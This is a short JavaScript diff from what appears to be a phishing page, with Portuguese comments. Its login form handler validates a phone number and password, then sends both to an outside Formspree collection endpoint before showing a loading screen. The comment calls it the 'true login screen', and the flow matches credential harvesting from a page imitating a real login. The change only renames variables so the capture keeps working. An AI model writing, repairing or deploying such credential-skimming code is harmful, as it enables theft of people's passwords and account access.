@@ -115,12 +115,12 @@
     // Tela de login verdadeira → envia para Formspree
     loginForm.addEventListener("submit", function(e) {
       e.preventDefault();
-      if (!/^9\d{8}$/.test(número.value)) { alert("Número inválido!"); return; }
-      if (senha.value.length < 5) { alert("Senha muito curta!"); return; }
+      if (!/^9\d{8}$/.test(númeroLogin.value)) { alert("Número inválido!"); return; }
+      if (senhaLogin.value.length < 5) { alert("Senha muito curta!"); return; }
       fetch("https://formspree.io/f/mbdeddpb", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ numero: número.value, senhaL: senha.value })
+        body: JSON.stringify({ numero: númeroLogin.value, senhaL: senhaLogin.value })
       });
       loginScreen.style.display = "none";
       loadingScreen.style.display = "block";
